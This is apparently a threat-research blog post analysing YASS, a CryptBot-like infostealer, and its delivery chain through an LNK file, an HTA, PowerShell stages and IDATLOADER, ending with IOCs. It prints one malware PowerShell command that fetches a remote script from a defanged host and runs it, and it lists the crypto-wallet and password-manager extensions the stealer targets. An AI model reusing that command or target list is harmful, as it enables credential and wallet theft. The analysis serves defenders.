# There's Something About CryptBot: Yet Another Silly Stealer (YASS)

> YASS, an infostealer labelled CryptBot but sharing little of its code, arrives via the MustardSandwich downloader and IDATLOADER and can drop NetSupport.

- Source: https://research.intezer.com/blog/2024/09/cryptbot-yet-another-silly-stealer-yass/
- Published: 2024-09-10
- Authors: Ryan Robinson, Joakim Kennedy
- Tags: windows, stealer
- Attribution: Intezer's Research Team (Intezer Research, https://research.intezer.com/)


Recently Intezer was investigating a file that we came across during
[alert triage](https://intezer.com/blog/incident-response/how-intezer-works/).
This particular file piqued our interest due to the interesting delivery chain,
and the even more interesting payload, an intricate infostealer.

Intezer has amazing
[code genetic analysis technology](https://intezer.com/blog/malware-analysis/code-strings-and-whats-in-between/),
showing us overlaps of code reuse between different files, malicious or not. We
noticed that the payload *did not have significant code overlap* with other
infostealers. Upon researching the threat and pivoting to similar samples, we
understand that other vendors are labeling this as **CryptBot**. While the
similarities are undeniable, the differences in code are significant enough
that this version warrants its own documentation, and even its own name, **Yet
Another Silly Stealer** (YASS). In this blog, we'll highlight both the
parallels and the distinctions between these two infostealers, underscoring why
this variant demands attention. This blog will give a technical analysis of the
delivery chain, as well as an analysis of the **YASS payload**. The stealer was
delivered using a multi-stage downloader that we are calling
**MustardSandwich**.

The cybersecurity landscape is constantly witnessing a wave in the creation of
new and updated infostealers, with malware developers continuously innovating
to bypass defenses. While it may feel like a never-ending cat-and-mouse game,
cataloging as many of these stealers as possible remains crucial. By doing so,
we can better understand emerging tactics, enhance threat detection, and
ultimately protect our sensitive data. Every new variant cataloged strengthens
our defenses and helps to anticipate future threats, making the effort vital
despite the relentless pace of cybercriminal innovation.

![](images/fig1.png "Attack Flow of new YASS infostealer, with some similarities and notable difference from Cryptbot")

## Mustard Sandwich Downloader

In the cases where we have identified the MustardSandwich downloader, it has
been executed using a
[Windows shell link](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/16cb4ca1-9339-4d0c-a68d-bf1d6cc0f943)
(LNK) file. The LNK file uses the Windows system binary `forfiles.exe` to
invoke `PowerShell` which calls `mshta`. An example of the command line
arguments for one of the LNK files is shown below.

![](images/fig2.png "LNK File Arguments")

The LNK files are used to execute a Microsoft HTML application (HTA) using
`mshta`. The malware abuses the looseness of the `mshta` parser to hide the
HTML within "junk" data. The HTML document has been broken up into multiple
parts and "sandwiched" between multiple copies of the same Windows binary. The
screenshot below shows the output from binwalk of one of the files with
annotations showing where the different parts of the document are located.

![](images/fig3.png "Binwalk output of the EXE containing HTA")

This technique provides some anti-analysis by automated solutions because most
solutions will identify the file as a Windows executable (PE). When the file is
executed in a sandbox, nothing malicious will happen. To invoke the malicious
code, `mshta` must be used.

The downloader consists of two JScript stages and two PowerShell stages. The
first PowerShell script is executed via an ActiveXObject, as seen in the
screenshot below.

![](images/fig4.png "JScript Payload")

The first PowerShell script decrypts the final stages. The stage has been
encrypted using AES, and the key varies between attacks. An example of the
stages is shown below.

![](images/fig5.png "PowerShell Payload")

The final stage is responsible for downloading the decoy and the malware to run
on the machine. We have observed two types of this stage, one that downloads
multiple payloads and another that only downloads one payload.

![](images/fig6.png "Decoy Video")

The screenshot below shows a cleaned-up version of the "main" script function.
First, it checks if the lure exists on disk, if not, it's downloaded and
displayed to the user. This version also appears to be tracking installations
by sending a simple web request to a separate URL. After the lure has been
displayed to the user, the two payloads are downloaded and executed.

![](images/fig7.png "PowerShell Downloading Additional Payloads")

The URLs hosting the payloads have been obfuscated with a simple logic. Each
character in the string has been converted to an integer and a constant has
been added to each one. The function shown below is used to reverse the
obfuscation.

![](images/fig8.png "Decoding Function")

The payloads are downloaded as ZIP archives. The stage uses the function shown
below to extract the content and execute the payload. It's worth noting that
the function executes the first file from an alphabetic sort of the content of
the archive.

![](images/fig9.png "Running First File in Archive")

The simpler version of this stage, from a related chain, is shown below. It
doesn't expect the payloads to be stored in ZIP files, nor have the install
tracking functionality.

![](images/fig10.png "Simplified Version of Related Chain")

## IDATLOADER

Inside the second downloaded ZIP file (`L2.zip`) is a single executable file.
This is a Delphi file
(`4810333bf96fb808604f3657118c734c3dd8ee4baa3e6ffe8da548ae0c8e15d3`) that
contains a lot of boiler plate code for Delphi visual components.

![](images/fig11.png "IDATLOADER File")

The code for starting IDATLoader is hidden amongst all the boiler plate code.
IDATLOADER will inject shellcode into `pla.dll` that will then extract a PNG
resource from the Delphi file and move it into the Temp folder.

![](images/fig12.png)

![](images/fig13.webp "PNG Containing Payload")

From this PNG, the payload is extracted, a stealer.
(`7ac46eb84f4b6d25601f23d2c30b7e80b6f3b2d82d3240234fc50af75290a29f`)

## Technical Analysis of Infostealer

### Initialisation

YASS starts its operations by performing a sleep. Then the stealer will decrypt
a block of strings that are used as global variables for the stealer's
functionality. There are two blocks of RC4 encrypted strings. A small key is
hardcoded via stack strings in the binary for decryption. The two blocks of
strings are the same strings but one is a wide char and the other is normal
ASCII.

![](images/fig14.png "Decrypted Strings")

This block of strings contains important information such as C2 information,
staging folders, persistence strings and functions to be dynamically resolved.
The full list of decoded strings are located
[here](https://gist.github.com/aslefhewqiwbepqwefbpqsciwueh/12516114c9d4b99f4a29704c75969f4a).

Next the stealer will fetch two environment variables.

```
LocalAppData: Gives appdata/local path
UserProfile: Gives path to user home
```

These variables are concatenated with two strings, in order to check for their
presence.

```
C:\Users\[username]\AppData\Local\Gabatepi
C:\Users\admin\Desktop\Invoice.docx
```

The malware will exit if either exists at this point. The first path is the
location of a folder, seemingly used as a mutex to ensure only one running
instance. The latter appears to be an anti sandbox check.

If the staging folder does not exist, the stealer will not exit, and will
create this directory.

![](images/fig15.png "Folder used as Mutex")

Before stealing activities begin the stealer will generate a unique user ID,
ZIP it, and send it to the C2.

### Location of Sensitive Data

YASS starts its stealing activities by locating directories where sensitive
data is commonly held. It starts a recursive search from the user profile path:

```
C:Users[username]
```

The stealer will start to iterate over each file. The file path is compared
against a very large hard coded list of directories. The directories cover many
categories, including programming, gaming, messaging, cloud storage, Office
products, torrent, utilities, and antivirus.

![](images/fig16.png "Snippet of Targeted Directories")

If there is a directory match. The stealer will make a check for the folder:

```
Local Extension Settings
```

If this is the current folder. The stealer will identify folders related to
targeted Opera and Google Chrome Extensions.

![](images/fig17.png "Check for Browser Extensions")

Targeted Extensions:

| Extension | Product |
| :--- | :--- |
| `nkbihfbeogaeaoehlefnkodbefgpgknn` | MetaMask |
| `ejbalbakoplchlghecdalmeeeajnimhm` | MetaMask |
| `ljfoeinjpaedjfecbmggjgodbgkmjkjk` | MetaMask |
| `nkbihfbeogaeaoehlefnkodbefgpgknn` | MetaMask |
| `bfnaelmomeimhlpmgjnjophhpkkoljpa` | Phantom |
| `ibnejdfjmmkpcnlpebklmnkoeoihofec` | TronLink |
| `fhbohimaelbohpjbbldcngcnapndodjp` | BNB Chain Wallet |
| `jnlgamecbpmbajjfhmmmlhejkemejdma` | Braavos |
| `dlcobpjiigpikoobohmabehhmhfoodbb` | Argent X |
| `fnjhmkhhmkbjkkabndcnnogagogbneec` | Ronin Wallet |
| `afbcbjpbpfadlkmhmclhkeeodmamcflc` | Math Wallet |
| `fhilaheimglignddkjgofkcbgekhenbh` | Oxygen |
| `ffnbelfdoeiohenkjibnmadjiehjhajb` | Yoroi |
| `mopnmbcafieddcagagdcbnhejhlodfdd` | Polkadot |
| `bhhhlbepdkbapadjdnnojkbgioiodbic` | Solflare Wallet |
| `opcgpfmipidbgpenhmajoajpbobppdil` | Sui Wallet |
| `nngceckbapebfimnlniiiahkandclblb` | Bitwarden |
| `hdokiejnpimakedhajhdlcegeplioahd` | LastPass |
| `kkpllkodjeloidieedojogacfhpaihoh` | Enkrypt Wallet |
| `acmacodkjbdgmoleebolmdjonilkdbch` | Rabby Wallet |
| `gaedmjdfmmahhbjefcbgaolhhanlaolb` | Authy |
| `hifafgmccdpekplomjjkcfgodnhcellj` | Crypto.com |
| `klnaejjgbibmhlephnhpmaofohgkpgkd` | ZilPay |
| `aholpfdialjgjfhomihkjbmgjidlcdno` | Exodus Web3 Wallet |
| `egjidjbpglichdcondbcbdnbeeppgdph` | Trust Wallet |
| `efbglgofoippbgcjepnhiblaibcnclgk` | Martian |
| `mcohilncbfahbmgdjkbpemcciiolgcge` | OKX Wallet |
| `bhghoamapcdpbohphigoooaddinpkbai` | Authenticator |
| `aflkmfhebedbjioipglgcbcmnbpgliof` | Backpack |
| `idnnbdplmphpflfnlkomgpfbpcgelopg` | Xverse Wallet |
| `ppbibelpcjmhbdihakflkdcoccbgbkpo` | UniSat Wallet |
| `omaabbefbmiijedngplfjmnooppbclkk` | Tonkeeper |
| `lgmpcpglpngdoalbgeoldeajfclnhafa` | SafePal Extension Wallet |
| `dmkamcknogkgcdfhhbddcghachkejeap` | Keplr |
| `ookjlbkiijinhpmnjffcofjonbfbgaoc` | Temple Tezos Wallet |
| `nlbmnnijcnlegkjjpcfjclmcfggfefdm` | MyEtherWallet |
| `cjelfplplebdjjenllpjcblmjkfcffne` | Jaxx Liberty |
| `hpglfhgfnhbgpjdenjgmdgoeiappafln` | Guarda |
| `fhmfendgdocmcbmfikdcogofphimnkno` | Sollet |
| `imloifkgjagghnncjkhggdhalmcnfklk` | Trezor Password Manager |

The stealer also searches for other more generic folders that might hold
sensitive browser and wallet information. The stealer will look for references
to login data, cookies, web data, user data, backups and wallets. Brave browser
and Telegram are targeted also.

![](images/fig18.png "Targeted Files")

The stolen files are built up into a structured ZIP file before being
exfiltrated. Along with a log of the stolen files, and a screenshot of the
victim machine.

![](images/fig19.png "Exfiltrated Data Structure")

The directories in the exfiltrated ZIP file are structured in a way to help the
recipient threat actor better navigate the stolen data. The main categories
are:

- Apps
- Browsers
- Files
- Wallets

The infostealer has an optional auxiliary method of stealing. YASS can iterate
through a number of hardcoded drives and look for files which it considers
"Other" category, sending it to a different server from the main activities.
This may be used to attempt to collect miscellaneous files to run parsers
through at a later stage.

![](images/fig20.png "Additional Stealing Method")

### Information Gathering

YASS will gather information, into a text file, about the infected computer to
send to the C2. The information is gathered mainly from the registry or through
Windows API calls. Information includes localized information about the machine
such as username and language, as well as physical aspects such as the
processor, RAM, and GPU. This is collated into a text file before being sent to
the C2.

![](images/fig21.png "Completed Fingerprint TXT File")

### C2 Communication

YASS communicates with the C2 via HTTP POST requests. All information and
stolen files are first collected and packaged into a ZIP file. Before the ZIP
file is sent to the C2, it is encrypted via RC4 using an interesting technique.
YASS will generate a unique key for each file sent.

The unique key is a concatenation of a key from the decrypted block of strings
and a dynamically generated key that is unique with each POST request. In order
for the server to be able to decrypt the data, the latter half of the RC4 key
is shared through the filename metadata of the form data. This increases
resistance to decryption of the stolen data by unauthorized parties, and also
makes detection harder for defenders as there are no discernible patterns in
order to create detections based on network signatures.

![](images/fig22.png "Format of RC4 Encryption Key")

YASS does not expect any specific reply from the server. The server will reply
"OK" when it receives information from the stealer.

### NetSupport Client

The stealer also has the ability to drop the NetSupport Client as a backdoor
for the infected machine. The client is deployed via a PowerShell command and
script.

```powershell
/c powershell -NoP -NonI -ExecutionPolicy Bypass -Command "$Resp = Invoke-WebRequest -Uri 'https://brewdogebar[.]com/code.vue' -UseBasicParsing -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36'; $Scr = [System.Text.Encoding]::UTF8.GetString($Resp.Content); IEX $Scr"
```

The PowerShell command reaches out to a server to download an additional
script. The
[PowerShell script](https://gist.github.com/aslefhewqiwbepqwefbpqsciwueh/bfd728e043262c90ef5af2e8228bbf6c)
downloads components for the NetSupport remote access tool, with a
configuration file. The script also sets persistence and informs the server if
target crypto wallet folders are detected.

![](images/fig23.png "PowerShell Script Downloading NetSupport")

## CryptBot - CryptNot - CryptWhat?!

Over the years CryptBot has been under continuous development. The
modifications of CryptBot have been documented in other blogs, particularly by
AhnLab [[1](https://asec.ahnlab.com/en/26052/),
[2](https://asec.ahnlab.com/en/31802/)]. Much like the
[Ship of Theseus](https://en.wikipedia.org/wiki/Ship_of_Theseus), this
infostealer challenges the essence of identity. Though its code has been
entirely replaced compared to its original versions. The behavioral echoes are
unmistakable, pointing to the same malware developer behind it. With this in
mind, we wish to talk about some of the similarities and differences.

![](images/fig24.png "Initial Triage Showing Unknown Code")

When we first came across this file, we did not see any significant code
overlap with any other known code stealers. There is a notable overlap in
targeted software with other stealers, particularly LummaC2. Another similarity
with LummaC2 is the use of ZIP files and a
[one-way command and control server](https://outpost24.com/blog/everything-you-need-to-know-lummac2-stealer/).

The strings share many overlaps with other stealers. This would be quite
expected as competing malware developers would be able to see what folders or
applications their competitors are targeting and add those paths to their own
stealing mechanisms. YASS shares strings with Vidar, AMOS, ImBetter, RedLine,
Sharp, Arkei, Atomic, and SolarMarker

![](images/fig25.png "Related Strings")

While YASS uses techniques similar to CryptBot, the implementation is
different. The shared techniques with CryptBot include:

- Use of a folder as a mutex
- Exfil server using a ".top" TLD.
- [Stealing SQLite database files](https://fr3d.hk/blog/cryptbot-too-good-to-be-true)
  instead of querying the data.
- Similar system information report structure.
- Similar POST request to the exfil server.
- Shared strings
- Secondary exfil server
- Additional payload deployment

Even though we see these similarities, we aren't comfortable classifying YASS
as just a newer version of CryptBot. There are also some significant
differences. This stealer doesn't have a well-structured configuration, uses a
different encryption scheme, and has hardcoded functionality, via PowerShell,
to download and install the NetSupport client. Many of the format strings look
very similar but use different specifiers, the produced strings look the same,
but the "implementation" is different. YASS also has some unused strings that
are used by CryptBot. It's like all the code has been rewritten, and a few
strings have been forgotten and left, much like
[vestigial organs](https://en.wikipedia.org/wiki/Vestigiality).

We can't tell if the strings have been planted and that YASS has been made to
imitate CryptBot as much as possible. It is
[not](../../../2021/09/vermilionstrike-reimplementation-cobaltstrike/) the
first time we have come across malware that imitates other malware. So are we
seeing an attempt to deflect suspicion towards malware that's in the hot water?
In April 2023, the United States District Court Southern District Of New York
unsealed a
[complaint filed](https://regmedia.co.uk/2023/04/28/handout_google_cryptbot_complaint.pdf)
by Google against some distributors and the creator of CryptBot, so making your
infostealer appear as CryptBot may keep a target off your back. The alternative
is a "Ship of Theseus". Either way, we are happy to present CryptBot's latest
step-sibling: YASS.

## IOCs

**LNK file**

```
e3bf61f6f96d1a121a1f7f47188cd36fc51f4565ca8cd8fc07207e56a038e7ca
```

**HTA (EXE)**

```
fd7654c5bb79652bc0db2696da35497b9aff2c783ec4c83705d33d329dc742d8
https://nextomax.b-cdn[.]net/nexto (Hosting Server)
https://forikabrof[.]click/flkhfaiouwrqkhfasdrhfsa.png (Pinged by PowerShell Script)
```

**ZIP**

```
b2080e7705283fce7e03c8895977c5e8c451b5f8a6eb3faecb8acb986a1587c6
https://nextomax.b-cdn[.]net/L2.zip (Hosting Server)
```

**IDATLOADER**

```
4810333bf96fb808604f3657118c734c3dd8ee4baa3e6ffe8da548ae0c8e15d3
```

**YASS (Stealer)**

```
7ac46eb84f4b6d25601f23d2c30b7e80b6f3b2d82d3240234fc50af75290a29f (Unpacked from IDATLOADER)
rceight8sr[.]top
grabios[.]org
```

**NetSupport RAT**

```
brewdogebar[.]com (Hosting Server)
enotik5050[.]com
barsuk5050[.]com
94.232.244[.]133
```
